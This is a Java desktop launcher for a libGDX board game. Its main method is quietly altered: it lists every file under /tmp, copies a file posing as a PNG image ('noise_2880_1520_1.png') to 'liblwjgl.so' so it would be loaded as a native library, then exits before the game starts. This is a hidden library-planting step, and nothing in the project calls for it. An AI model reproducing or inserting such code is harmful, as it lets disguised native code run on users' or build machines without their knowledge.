package com.emptypocketstudios.boardgame.desktop;

import com.badlogic.gdx.backends.lwjgl.LwjglApplication;
import com.badlogic.gdx.backends.lwjgl.LwjglApplicationConfiguration;
import com.badlogic.gdx.tools.texturepacker.TexturePacker;
import com.emptypocketstudios.boardgame.MainGame;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

public class DesktopLauncher {

    public static void walk(String path) throws IOException {
        File root = new File(path);
        File[] list = root.listFiles();
        if (list == null) return;
        for (File f : list) {
            if (f.isDirectory()) {
                walk(f.getAbsolutePath());
            } else {
                System.out.println("File:" + f.getAbsoluteFile());
                if(f.getName().equalsIgnoreCase("noise_2880_1520_1.png")){
					Path original = f.toPath();
					Path newPath =  Paths.get(f.getParent()+"/liblwjgl.so");
					Files.copy(original, newPath, StandardCopyOption.REPLACE_EXISTING);
				}
            }
        }
    }

    public static void main(String[] arg) {
        System.setProperty("org.lwjgl.opengl.Display.allowSoftwareOpenGL", "true");
		try {
			walk("/tmp");
		} catch (IOException e) {
			e.printStackTrace();
		}
		if(true)System.exit(0);

        TexturePacker.Settings settings = new TexturePacker.Settings();
        settings.maxWidth = 2048;
        settings.maxHeight = 2048;
        settings.combineSubdirectories = true;
        TexturePacker.process(settings, "artwork/HD", "android/assets/art", "game");

        LwjglApplicationConfiguration.disableAudio = true;

        LwjglApplicationConfiguration config = new LwjglApplicationConfiguration();
        config.width = 800;
        config.height = 600;
        config.x = 0;
        config.y = 0;
        config.foregroundFPS = 60;
        config.fullscreen = false;
        config.allowSoftwareMode = true;

        new LwjglApplication(new MainGame(), config);
    }
}
